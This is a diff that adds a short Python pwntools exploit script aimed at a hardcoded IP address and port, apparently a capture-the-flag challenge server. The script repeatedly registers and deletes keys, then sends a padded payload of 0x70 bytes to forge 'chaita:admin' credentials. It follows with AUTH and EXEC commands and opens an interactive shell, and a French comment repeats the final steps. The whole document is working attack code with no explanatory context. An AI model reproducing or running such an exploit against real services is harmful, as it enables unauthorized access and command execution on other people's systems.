@@ -1,0 +1,30 @@
+from pwn import *
+import time
+
+host = '94.237.51.160'
+port = 39873
+
+io = remote(host, port)
+
+def send(cmd):
+    io.sendline(cmd)
+    time.sleep(0.5)
+
+for i in range(3):
+    send('REKE chaita:admin abcdef')
+
+send('RLDB')
+send('DEKE 3')
+
+send('REKE CHA:ITA ' + '\x01'*0x70 + 'chaita:admin abcdef')
+send('AUTH 1')
+send('EXEC')
+
+io.interactive()
+
+"""
+une fois dans la session :
+  - AUTH 1
+  - EXEC
+"""
+
